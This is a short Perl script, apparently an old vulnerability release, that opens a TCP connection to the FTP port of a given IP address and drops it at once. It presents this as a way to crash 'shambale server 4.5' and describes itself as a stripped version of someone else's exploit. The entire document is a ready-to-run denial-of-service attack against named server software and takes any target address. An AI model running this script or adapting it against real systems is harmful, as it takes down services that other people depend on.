#!/usr/bin/perl
#
# This tool (tool not exploit!) crashes shambale server 4.5
# This is a stripped version of Guido Bakkers exploit code (bedankt)
#
use Getopt::Std;
use IO::Socket;
getopts('s:', \%args);
&usage if !defined($args{s});
$serv = $args{s};
$EOL="\015\012";
$remote = IO::Socket::INET->new(
                   Proto       => "tcp",
                   PeerAddr    => $args{s},
                   PeerPort    => "ftp(21)",
               ) || die("Unable to connect to ftp port at $args{s}\n");
$remote->autoflush(1);
print "Done...\n";
exit; # remove this and the server will *NOT* crash
sub usage {die("\n$0 -s ipaddress\n\n");}
